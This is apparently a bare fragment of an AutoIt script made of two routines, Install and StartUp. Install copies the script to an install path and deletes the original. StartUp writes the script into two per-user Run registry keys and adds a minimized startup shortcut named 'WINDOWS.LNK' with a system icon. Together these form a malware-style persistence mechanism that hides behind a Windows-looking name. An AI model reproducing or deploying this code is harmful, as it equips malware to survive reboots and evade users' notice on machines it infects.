Func Install()
   If @ScriptFullPath <> $INSTALL_PATH Then
	  FileCopy(@ScriptFullPath, $INSTALL_PATH)
	  SelfDelete(5)
	  Exit
   EndIf
   MsgBox(0, "", "Startup")
EndFunc

Func StartUp()
   RegWrite("HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\EXPLORER\RUN\", @ScriptName, "REG_EXPAND_SZ", '"' & @ScriptFullPath & '"')
   RegWrite("HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\", @ScriptName, "REG_EXPAND_SZ", '"' & @ScriptFullPath & '"')
   FileCreateShortcut(@ScriptFullPath, @StartupDir & "\WINDOWS.LNK", "%APPDATA%\MICROSOFT\", "", "WINDOWS", @SystemDir & "\SHELL32.DLL", "", "4", @SW_MINIMIZE)
EndFunc